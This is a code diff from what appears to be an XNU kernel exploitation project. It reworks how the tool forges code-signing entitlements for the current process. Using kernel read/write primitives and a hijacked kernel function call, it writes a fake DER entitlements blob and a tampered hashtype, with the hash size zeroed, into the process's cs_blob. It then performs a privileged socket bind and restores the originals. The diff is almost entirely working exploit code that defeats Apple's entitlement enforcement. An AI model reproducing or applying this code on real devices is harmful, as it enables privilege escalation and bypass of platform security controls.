@@ -82,44 +82,19 @@ uintptr_t get_proc_cs_blobs(uintptr_t proc) {
 }
 
 
-void assign_entitlements(xe_util_kfunc_t kfunc, uintptr_t proc, CFDictionaryRef entitlements) {
-    uintptr_t cs_blob = get_proc_cs_blobs(proc);
-    
-    CFDataRef cs_der_data;
-    uint64_t ce_res = CESerializeCFDictionary(CECRuntime, entitlements, &cs_der_data);
-    if (ce_res != kCENoError) {
-        xe_log_error("failed to serialize provided entitlements plist");
-        exit(1);
-    }
-    
-    size_t cs_der_blob_size = offsetof(CS_GenericBlob, data) + CFDataGetLength(cs_der_data);
-    CS_GenericBlob* cs_der_blob = malloc(cs_der_blob_size);
-    cs_der_blob->magic = htonl(CSMAGIC_EMBEDDED_DER_ENTITLEMENTS);
-    cs_der_blob->length = htonl(cs_der_blob_size);
-    memcpy(cs_der_blob->data, CFDataGetBytePtr(cs_der_data), CFDataGetLength(cs_der_data));
-    
-    uintptr_t cs_der_entitlements_blob = xe_allocator_small_allocate_disowned(cs_der_blob_size);
-    xe_kmem_write(cs_der_entitlements_blob, 0, cs_der_blob, cs_der_blob_size);
-    
+void ml_nofault_copy(xe_util_kfunc_t kfunc, uintptr_t dst, void* src, uint32_t size) {
     uintptr_t temp_buffer;
-    xe_allocator_small_mem_t temp_allocator = xe_allocator_small_mem_allocate(8, &temp_buffer);
+    xe_allocator_small_mem_t allocator = xe_allocator_small_mem_allocate(size, &temp_buffer);
+    xe_kmem_write(temp_buffer, 0, src, size);
     
-    uint64_t kfunc_args[8];
-    bzero(kfunc_args, sizeof(kfunc_args));
-    xe_kmem_write_uint64(temp_buffer, 0, 0);
-    kfunc_args[0] = temp_buffer;
-    kfunc_args[1] = xe_kmem_read_uint64(cs_blob, TYPE_CS_BLOB_MEM_CSB_HASHTYPE_OFFSET) + TYPE_CS_HASH_MEM_CS_SIZE_OFFSET;
-    kfunc_args[2] = sizeof(size_t);
-    xe_util_kfunc_exec(kfunc, xe_slider_kernel_slide(FUNC_ML_NOFAULT_COPY_ADDR), kfunc_args);
+    uint64_t args[8];
+    bzero(args, sizeof(args));
+    args[0] = temp_buffer;
+    args[1] = dst;
+    args[2] = size;
+    xe_util_kfunc_exec(kfunc, xe_slider_kernel_slide(FUNC_ML_NOFAULT_COPY_ADDR), args);
     
-    xe_kmem_write_uint64(temp_buffer, 0, cs_der_entitlements_blob);
-    kfunc_args[0] = temp_buffer;
-    kfunc_args[1] = cs_blob + TYPE_CS_BLOB_MEM_CSB_DER_ENTITLEMENTS_BLOB_OFFSET;
-    kfunc_args[2] = sizeof(uint64_t);
-    xe_util_kfunc_exec(kfunc, xe_slider_kernel_slide(FUNC_ML_NOFAULT_COPY_ADDR), kfunc_args);
-    
-    xe_allocator_small_mem_destroy(&temp_allocator);
-    CFRelease(cs_der_data);
+    xe_allocator_small_mem_destroy(&allocator);
 }
 
 
@@ -152,10 +127,48 @@ int main(int argc, const char * argv[]) {
         exit(1);
     }
     
-    CFDictionaryRef plist = parse_entitlement_plist("entitlements.plist");
+    CFDictionaryRef entitlements = parse_entitlement_plist("entitlements.plist");
+    
+    uintptr_t proc = xe_xnu_proc_current_proc();
+    xe_log_debug("proc: %p", (void*)proc);
+    uintptr_t cs_blob = get_proc_cs_blobs(proc);
+    xe_log_debug("cs_blob: %p", (void*)cs_blob);
+    uintptr_t cs_der_entitlements_blob = xe_kmem_read_uint64(cs_blob, TYPE_CS_BLOB_MEM_CSB_DER_ENTITLEMENTS_BLOB_OFFSET);
+    xe_log_debug("cs_der_entitlements_blob: %p", (void*)cs_der_entitlements_blob);
+    uintptr_t csb_hashtype = xe_kmem_read_uint64(cs_blob, TYPE_CS_BLOB_MEM_CSB_HASHTYPE_OFFSET);
+    xe_log_debug("csb_hashtype: %p", (void*)csb_hashtype);
+    
+    CFDataRef fake_der_blob_data;
+    uint64_t ce_res = CESerializeCFDictionary(CECRuntime, entitlements, &fake_der_blob_data);
+    if (ce_res != kCENoError) {
+        xe_log_error("failed to serialize provided entitlements plist");
+        exit(1);
+    }
+    
+    size_t fake_der_blob_size = offsetof(CS_GenericBlob, data) + CFDataGetLength(fake_der_blob_data);
+    uintptr_t fake_der_blob;
+    xe_allocator_small_mem_t fake_der_allocator = xe_allocator_small_mem_allocate(fake_der_blob_size, &fake_der_blob);
+    
+    xe_kmem_write_uint32(fake_der_blob, offsetof(CS_GenericBlob, magic), htonl(CSMAGIC_EMBEDDED_DER_ENTITLEMENTS));
+    xe_kmem_write_uint32(fake_der_blob, offsetof(CS_GenericBlob, length), htonl(fake_der_blob_size));
+    xe_kmem_write(fake_der_blob, offsetof(CS_GenericBlob, data), (void*)CFDataGetBytePtr(fake_der_blob_data), CFDataGetLength(fake_der_blob_data));
+    CFRelease(fake_der_blob_data);
+    xe_log_debug("fake csb_der_entitlements_blob: %p", (void*)fake_der_blob);
+    
+    uintptr_t fake_csb_hashtype;
+    xe_allocator_small_mem_t fake_csb_hashtype_allocator = xe_allocator_small_mem_allocate(TYPE_CS_HASH_SIZE, &fake_csb_hashtype);
+    xe_kmem_copy(fake_csb_hashtype, csb_hashtype, TYPE_CS_HASH_SIZE);
+    xe_kmem_write_uint64(fake_csb_hashtype, TYPE_CS_HASH_MEM_CS_SIZE_OFFSET, 0);
+    xe_log_debug("fake csb_hashtype: %p", (void*)fake_csb_hashtype);
+    
     xe_util_kfunc_t kfunc = xe_util_kfunc_create(VAR_ZONE_ARRAY_LEN - 1);
-    assign_entitlements(kfunc, xe_xnu_proc_current_proc(), plist);
-        
+    
+    xe_log_info("setting fake entitlements and hashtype");
+    // FIXME: ml_nofault_copy randomly freezes when copying full cs_blob
+    ml_nofault_copy(kfunc, cs_blob + TYPE_CS_BLOB_MEM_CSB_HASHTYPE_OFFSET, &fake_csb_hashtype, sizeof(uintptr_t));
+    ml_nofault_copy(kfunc, cs_blob + TYPE_CS_BLOB_MEM_CSB_DER_ENTITLEMENTS_BLOB_OFFSET, &fake_der_blob, sizeof(uintptr_t));
+    xe_log_info("fake entitlements and hashtype set");
+    
     res = bind(fd, (struct sockaddr*)&addr, sizeof(addr));
     if (res) {
         xe_log_error("bind failed after adding entitlement");
@@ -165,6 +178,14 @@ int main(int argc, const char * argv[]) {
     }
     
     close(fd);
+    
+    xe_log_info("restoring entitlements and hashtype");
+    ml_nofault_copy(kfunc, cs_blob + TYPE_CS_BLOB_MEM_CSB_DER_ENTITLEMENTS_BLOB_OFFSET, &cs_der_entitlements_blob, sizeof(uintptr_t));
+    ml_nofault_copy(kfunc, cs_blob + TYPE_CS_BLOB_MEM_CSB_HASHTYPE_OFFSET, &csb_hashtype, sizeof(uintptr_t));
+    xe_log_info("restored entitlements and hashtype");
+    
+    xe_allocator_small_mem_destroy(&fake_der_allocator);
+    xe_allocator_small_mem_destroy(&fake_csb_hashtype_allocator);
     xe_util_kfunc_destroy(&kfunc);
     return 0;
 }
